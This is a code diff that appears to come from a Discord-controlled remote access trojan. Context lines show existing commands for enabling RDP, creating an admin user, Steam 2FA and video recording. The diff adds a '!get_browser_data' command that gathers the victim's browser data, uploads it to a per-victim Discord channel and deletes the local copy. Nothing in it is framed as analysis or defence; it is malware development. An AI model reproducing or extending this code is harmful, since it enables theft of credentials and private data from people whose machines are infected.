@@ -12,6 +12,7 @@ from features.setup import *
 from features.steam2fa import *
 from features.video_record import *
 from features.windows import *
+from features.browsers.browsers import get_browesers_data
 import json
 import re
 
@@ -80,6 +81,8 @@ def main():
             await rdp_enable(await bot.get_context(message))
         elif re.match(r'!create_admin_user',message.content):
             await create_admin_user(await bot.get_context(message))
+        elif re.match(r'!get_browser_data',message.content):
+            await get_browser_data(await bot.get_context(message))
         elif re.match(r'!help',message.content):
             await help(await bot.get_context(message))
 
@@ -208,6 +211,16 @@ def main():
         print(f"recording path: {recording_path}")
         await ctx.send(file=discord.File(recording_path))
         os.remove(recording_path)
+
+
+    @bot.command()
+    async def get_browser_data(ctx):
+        if ctx.channel.name != generate_uuid():
+            return
+
+        browsers_data_path = get_browesers_data()
+        await ctx.send(file=discord.File(browsers_data_path))
+        os.remove(browsers_data_path)
 
 
     @bot.command()
